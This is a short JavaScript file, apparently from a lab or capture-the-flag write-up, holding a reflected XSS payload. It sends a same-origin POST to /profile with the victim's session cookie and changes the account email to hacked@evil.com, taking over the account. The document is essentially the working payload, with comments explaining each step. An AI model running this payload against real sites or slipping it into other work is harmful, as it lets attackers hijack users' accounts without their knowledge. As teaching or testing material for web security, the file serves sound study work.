// B.2 reflected XSS payload - account takeover.
// When a logged-in victim loads this script, their browser sends a POST to
// /profile with their own session cookie, changing their email. This proves
// the attacker can modify the victim's account (account takeover).
fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  credentials: "include",                 // send the victim's session cookie
  body: "email=hacked@evil.com"           // the attacker-controlled change
});
